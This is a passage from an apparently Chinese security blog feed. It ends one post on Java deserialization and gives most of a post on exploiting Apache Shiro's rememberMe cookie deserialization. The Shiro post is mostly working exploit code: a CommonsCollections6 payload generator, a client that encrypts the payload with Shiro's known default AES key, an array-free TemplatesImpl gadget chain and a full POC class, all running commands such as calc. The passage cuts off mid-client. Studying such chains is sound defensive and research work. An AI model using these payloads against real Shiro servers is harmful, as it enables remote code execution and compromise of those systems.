</span><br><span class="line">        byte[] bytes = serialize(hashSet);  </span><br><span class="line">        unserialize(bytes);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;  </span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">        field.setAccessible(true);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void unserialize(byte[] bytes) throws Exception&#123;  </span><br><span class="line">        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);  </span><br><span class="line">            ObjectInputStream oin = new ObjectInputStream(bain))&#123;  </span><br><span class="line">            oin.readObject();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static byte[] serialize(Object o) throws Exception &#123;  </span><br><span class="line">        try (ByteArrayOutputStream baout = new ByteArrayOutputStream();  </span><br><span class="line">             ObjectOutputStream oout = new ObjectOutputStream(baout)) &#123;  </span><br><span class="line">            oout.writeObject(o);  </span><br><span class="line">            return baout.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>EvilTest.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line">public class EvilTest extends AbstractTranslet &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public EvilTest() throws Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>有点杂乱，但通过这次学习明白了许多知识点，还会继续学习，后面会分析 8u20，7u21在 7u25中修复了，但还是会有安全问题。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《JAVA安全漫谈》</p>]]></content>
      
      
      <categories>
          
          <category> JAVA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA-Shiro反序列化详解</title>
      <link href="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/"/>
      <url>/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>参考 ：<a href="https://blog.csdn.net/m0_67401270/article/details/126721347">Shiro环境搭建</a></p><h1 id="前景回顾"><a href="#前景回顾" class="headerlink" title="前景回顾"></a>前景回顾</h1><p>shiro爆出了一个默认key的反序列化漏洞。至今已有大量的分析文章分析了该漏洞的原理，所以本文不再重复分析该漏洞的相关原理，可以参考以下几篇文章的分析：</p><ul><li><a href="https://blog.knownsec.com/2016/08/apache-shiro-java/">https://blog.knownsec.com/2016/08/apache-shiro-java/</a></li><li><a href="https://blog.zsxsoft.com/post/35">https://blog.zsxsoft.com/post/35</a></li><li><a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html">http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html</a></li></ul><p>也可以参考我在CSDN 中写过的文章:<br><a href="https://blog.csdn.net/snowlyzz/article/details/128192360?spm=1001.2014.3001.5501">[Java反序列化]—Shiro反序列化(二)_反序列化cc链_snowlyzz的博客-CSDN博客</a><br>原因可能是当时写的不够详细，也不够深入，至此，本站的博客都 会打造一个 详细深入的学习</p><p>进入正题：</p><p>如果登录时选择了remember me的多选框，则登录成功后服务端会返回一个rememberMe的Cookie：</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/1.jpg"></p><p>对此，我们攻击过程如下： </p><ol><li>使用以前学过的CommonsCollections利用链生成一个序列化Payload </li><li>使用Shiro默认Key进行加密 </li><li>将密文作为rememberMe的Cookie发送给服务端：</li></ol><p>这里结合CC6  编写成一个CLASS进行触发链子：</p><p>CC6.CLASS</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class CommonsCollections6 &#123;</span><br><span class="line">    public byte[] getPayload(String command) throws Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,</span><br><span class="line">                        Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;,</span><br><span class="line">                        new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,</span><br><span class="line">                        Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;,</span><br><span class="line">                        new String[] &#123; command &#125;),</span><br><span class="line">                new ConstantTransformer(1),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        // 不再使用原CommonsCollections6中的HashSet，直接使用HashMap</span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tme = new TiedMapEntry(outerMap, &quot;keykey&quot;);</span><br><span class="line"></span><br><span class="line">        Map expMap = new HashMap();</span><br><span class="line">        expMap.put(tme, &quot;valuevalue&quot;);</span><br><span class="line"></span><br><span class="line">        outerMap.remove(&quot;keykey&quot;);</span><br><span class="line"></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);</span><br><span class="line">        f.setAccessible(true);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        return barr.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Client.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.shiro.codec.Base64;  </span><br><span class="line">import org.apache.shiro.crypto.AesCipherService;  </span><br><span class="line">import org.apache.shiro.util.ByteSource;  </span><br><span class="line">public class Client &#123;  </span><br><span class="line">    public static void main(String []args) throws Exception &#123;  </span><br><span class="line">        byte[] payloads = new CommonsCollections6().getPayload(&quot;calc.exe&quot;);  </span><br><span class="line">        AesCipherService aes = new AesCipherService();  </span><br><span class="line">        byte[] key = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);  </span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);  </span><br><span class="line">        System.out.printf(ciphertext.toString());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目的是将 参数传入CC6 ，再将payload 进行 aes 加密，传入 Shiro 客户端中会发现结果没有像预想那样 弹出计算器，这是为什么？</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/x.jpg"></p><p>我们从报错信息 从下往上看， 看到倒数第一行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass(ClassResolvingObjectInputStream.java:53)</span><br></pre></td></tr></table></figure><p>可以看到这是一个 ObjectInputStream 的一个内置类，重写了其 resolveClass 方法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public class ClassResolvingObjectInputStream extends ObjectInputStream &#123;  </span><br><span class="line">  </span><br><span class="line">    public ClassResolvingObjectInputStream(InputStream inputStream) throws IOException &#123;  </span><br><span class="line">        super(inputStream);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    /**  </span><br><span class="line">     * Resolves an &#123;@link ObjectStreamClass&#125; by delegating to Shiro&#x27;s   </span><br><span class="line">     * &#123;@link ClassUtils#forName(String)&#125; utility method, which is known to work in all ClassLoader environments.  </span><br><span class="line">     ** @param osc the ObjectStreamClass to resolve the class name.  </span><br><span class="line">     * @return the discovered class  </span><br><span class="line">     * @throws IOException never - declaration retained for subclass consistency  </span><br><span class="line">     * @throws ClassNotFoundException if the class could not be found in any known ClassLoader  </span><br><span class="line">     */    @Override  </span><br><span class="line">    protected Class&lt;?&gt; resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException &#123;  </span><br><span class="line">        try &#123;  </span><br><span class="line">            return ClassUtils.forName(osc.getName());  </span><br><span class="line">        &#125; catch (UnknownClassException e) &#123;  </span><br><span class="line">            throw new ClassNotFoundException(&quot;Unable to load ObjectStreamClass [&quot; + osc + &quot;]: &quot;, e);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```txt</span><br><span class="line">**resolveClass这个方法是Java原生反序列的时候必定会调用的，这里重写了就不会调用Java内置的resolveClass了**</span><br></pre></td></tr></table></figure><p>resolveClass 是反序列化用来查找类的一个方法，在读取序列化流的时候，督导一个字符串形式的类名，需要通过这个方法来找到对应的 Java.lang.CLass对象</p><p>对比一下其父类的 resolveClass，也就是 ObjectInputStream 中的  方法 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc)  </span><br><span class="line">    throws IOException, ClassNotFoundException  </span><br><span class="line">&#123;  </span><br><span class="line">    String name = desc.getName();  </span><br><span class="line">    try &#123;  </span><br><span class="line">        return Class.forName(name, false, latestUserDefinedLoader());  </span><br><span class="line">    &#125; catch (ClassNotFoundException ex) &#123;  </span><br><span class="line">        Class&lt;?&gt; cl = primClasses.get(name);  </span><br><span class="line">        if (cl != null) &#123;  </span><br><span class="line">            return cl;  </span><br><span class="line">        &#125; else &#123;  </span><br><span class="line">            throw ex;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>区别就是 前者用的是 org.apache.shiro.util.ClassUtils#forName , 先跟进这个forName ClassUtils#看一眼  这里首先使用了THREAD_CL_ACCESSOR.loadClass类加载器，这里手动F9就会发现fqcn变成了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;[Lorg.apache.commons.collections.Transformer;&quot;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/3.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[L是一个JVM的标记，说明实际上这是一个数组，即Transformer[]</span><br></pre></td></tr></table></figure><p>那么我们在异常捕捉的位置下个断点，看看是哪个类触发了异常：</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/5.jpg"></p><p>可见，出异常时加载的类名为&#96;&#96;&#96;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Lorg.apache.commons.collections.Transformer; 。这个类名看起来 怪，其实就是表示 org.apache.commons.collections.Transformer 的数组。</span><br></pre></td></tr></table></figure><p>看了网上文章的解释是 ：</p><ol><li>数组形式会使得shiro想尝试从本地加载时，path也被赋上数组标识，导致无法从本地jar包中正常获取。</li><li>Class.forName 支持加载数组，而 ClassLoader.loadClass 不支持 加载数组，这个区别导致了问题。</li></ol><p>这里仅给出最后的结论：如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。这就 解释了为什么CommonsCollections6无法利用了，因为其中用到了Transformer数组。</p><h1 id="构造不含数组的反序列化链"><a href="#构造不含数组的反序列化链" class="headerlink" title="构造不含数组的反序列化链"></a>构造不含数组的反序列化链</h1><p>我们的链子 要满足没有数组的情况，也就是不能用 ChainedTransformer#transform</p><p>参考 安全漫谈和此文<br><a href="https://www.anquanke.com/post/id/192619">Java反序列化利用链分析之Shiro反序列化-安全客 - 安全资讯平台 (anquanke.com)</a></p><p>我们可以用到 TemplatesImpl 也就是我们的CC3 来进行拼接，我们可以通过以下几行代码来执行一段JAVA 的字节码 ~</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">    TemplatesImpl obj = new TemplatesImpl();  </span><br><span class="line">    setFieldValue(obj,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);  </span><br><span class="line">    setFieldValue(obj,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">    setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl());  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而 我们又可以 使用 InvokeTransformer 去反射调用 TemplatesImpl#newTransformer方法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123; </span><br><span class="line">new ConstantTransformer(obj), </span><br><span class="line">new InvokerTransformer(&quot;newTransformer&quot;, null, null) &#125;;</span><br></pre></td></tr></table></figure><p>不过这里任然是 数组，那么如何 过程中的 Transformer数组呢？</p><p>在CC6中 用到了一个类   TiedMapEntry ，其构造方法中接收两个参数，一个是Map  ，第二个是Key</p><p>TiedMapEntry 有个 getValue 方法，调用了 map 的get 方法，并且传入了 key</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public Object getValue() &#123; </span><br><span class="line">return map.get(key); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当这个map是LazyMap时，其get方法就是触发transform的关键点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public Object get(Object key) &#123;  </span><br><span class="line">    // create value for key if key is not currently in the map  </span><br><span class="line">    if (map.containsKey(key) == false) &#123;  </span><br><span class="line">        Object value = factory.transform(key);  </span><br><span class="line">        map.put(key, value);  </span><br><span class="line">        return value;  </span><br><span class="line">    &#125;  </span><br><span class="line">    return map.get(key);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们以往构造CommonsCollections Gadget的时候，对 LazyMap#get 方法的参数key是不关心的，因为 通常Transformer数组的首个对象是ConstantTransformer，我们通过ConstantTransformer来初始化 恶意对象。</p><p>但是 此时我们无法使用Transformer 数组了，也就不能再使用 ConstantTransformer。</p><p>我们将注意力关注在  InvokerTransformer.transform上</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/tr.png"></p><p>这里是最经典的反射写法，根据传入的 input对象，调用其 iMethodName(可控) 那么如果这里传入的是我们构造好的 TemplatesImpl 对象呢，他是否可以调用 newtransform加载字节码</p><p>很明显，这样我们就可以通过将<code>iMethodName</code>置为<code>newTransformer</code>，从而完成后续的templates gadgets。</p><p>这里将 构造好的TemplatesImpl 对象 (key) 作为 InvokerTransformer.transform的函数的input传入，我们就可以将链子串联起来了</p><h1 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h1><p>首先还是 创建利用点  TemplatesImpl 对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl obj = new TemplatesImpl();  </span><br><span class="line">setFieldValue(obj,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);  </span><br><span class="line">setFieldValue(obj,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br></pre></td></tr></table></figure><p>然后我们创建一个用来调用newTransformer方法的InvokerTransformer，但注意的是，此时先传入一 个人畜无害的方法，比如 getClass ，避免恶意方法在构造Gadget的时候触发：</p><p><code>Transformer transformer = new InvokerTransformer(&quot;getClass&quot;, null, null);</code></p><p>再把 CC6的代码复制过来 然后改上一节说到的点，就是将原来TiedMapEntry 构造时的第二个参数key，改为前面创建的 TemplatesImpl 对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HashMap innermap = new HashMap();  </span><br><span class="line">//outMap = LazyMap.class  </span><br><span class="line">Map outmap = LazyMap.decorate(innermap, transformer); </span><br><span class="line">//此时 factory=InvokerTransformer.transform(key)  此时要调用get传key进去  </span><br><span class="line">  </span><br><span class="line">//接上LazyMap 调用get 传key 步骤：  </span><br><span class="line">TiedMapEntry tme = new TiedMapEntry(outmap, obj);  </span><br><span class="line">  </span><br><span class="line">Map expMap = new HashMap();  </span><br><span class="line">expMap.put(tme, &quot;valuevalue&quot;);  </span><br><span class="line">  </span><br><span class="line">outmap.clear();</span><br></pre></td></tr></table></figure><p>这里使用 outerMap.remove(“keykey”); 来移 除key的副作用，现在是通过 outerMap.clear(); ，效果相同。 </p><h2 id="调用顺序"><a href="#调用顺序" class="headerlink" title="调用顺序"></a>调用顺序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">java.util.HashMap.put()</span><br><span class="line">=&gt;java.util.HashMap.hash()</span><br><span class="line">=&gt;org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TiedMapEntry#hashCode()</span><br><span class="line">=&gt;TiedMapEntry#getValue(key=Transform恶意类)</span><br><span class="line"></span><br><span class="line">LazyMap#get()</span><br><span class="line">=&gt; LazyMap.decorate(Map=innerMap, factory=InvokerTransformer)</span><br><span class="line">=&gt; get() -&gt; InvokerTransformer.transform(Transform恶意类)</span><br><span class="line"></span><br><span class="line">InvokerTransformer#transform()</span><br><span class="line">input = Transform恶意类</span><br><span class="line">iMethodName = newTransformer (可控)</span><br><span class="line">iParamTypes = code (可控)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后，将 InvokerTransformer 的方法从人畜无害的 getClass ，改成 newTransformer ，正式完成武 器装配。</p><p>完整POC：</p><p>CommonsCollectionsShiro.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line">import org.apache.commons.collections.Transformer;  </span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line">import org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">import java.io.ByteArrayOutputStream;  </span><br><span class="line">import java.io.ObjectOutputStream;  </span><br><span class="line">import java.lang.reflect.Field;  </span><br><span class="line">import java.util.HashMap;  </span><br><span class="line">import java.util.Map;  </span><br><span class="line">  </span><br><span class="line">public class CommonsCollectionsShiro &#123;  </span><br><span class="line">        public byte[] getPayload(byte[] clazzBytes) throws Exception &#123;  </span><br><span class="line">            //TemplatesImpl恶意类  </span><br><span class="line">            TemplatesImpl obj = new TemplatesImpl();  </span><br><span class="line">            setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;clazzBytes&#125;);  </span><br><span class="line">            setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);  </span><br><span class="line">            setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());  </span><br><span class="line">  </span><br><span class="line">            //Faketransform  </span><br><span class="line">            Transformer transformer = new InvokerTransformer(&quot;getClass&quot;, null, null);  </span><br><span class="line">            //LazyMap.class  </span><br><span class="line">            Map innerMap = new HashMap();  </span><br><span class="line">            Map outerMap = LazyMap.decorate(innerMap, transformer);  </span><br><span class="line">            //TiedMapEntry.class  </span><br><span class="line">            TiedMapEntry tme = new TiedMapEntry(outerMap, obj);  </span><br><span class="line">            //HashMap.class  </span><br><span class="line">            Map expMap = new HashMap();  </span><br><span class="line">            expMap.put(tme, &quot;valuevalue&quot;);  </span><br><span class="line">  </span><br><span class="line">            outerMap.clear();  </span><br><span class="line">            //将假的transform 中的  method 改成 newTransformer            setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);  </span><br><span class="line">  </span><br><span class="line">            // ==================  </span><br><span class="line">            // 生成序列化字符串  </span><br><span class="line">            ByteArrayOutputStream barr = new ByteArrayOutputStream();  </span><br><span class="line">            ObjectOutputStream oos = new ObjectOutputStream(barr);  </span><br><span class="line">            oos.writeObject(expMap);  </span><br><span class="line">            oos.close();  </span><br><span class="line">  </span><br><span class="line">            return barr.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;  </span><br><span class="line">            Field field = obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">            field.setAccessible(true);  </span><br><span class="line">            field.set(obj, value);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>写个Client 类配合 CommonsCollectionsShiro.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import javassist.ClassPool;  </span><br><span class="line">import javassist.CtClass;  </span><br><span class="line">import org.apache.shiro.codec.Base64;  </span><br><span class="line">import org.apache.shiro.crypto.AesCipherService;  </span><br><span class="line">import org.apache.shiro.util.ByteSource;  </span><br><span class="line">import java.io.IOException;  </span><br><span class="line">public class Client &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        ClassPool pool = ClassPool.getDefault();  </span><br><span class="line">  </span><br><span class="line">        CtClass clazz 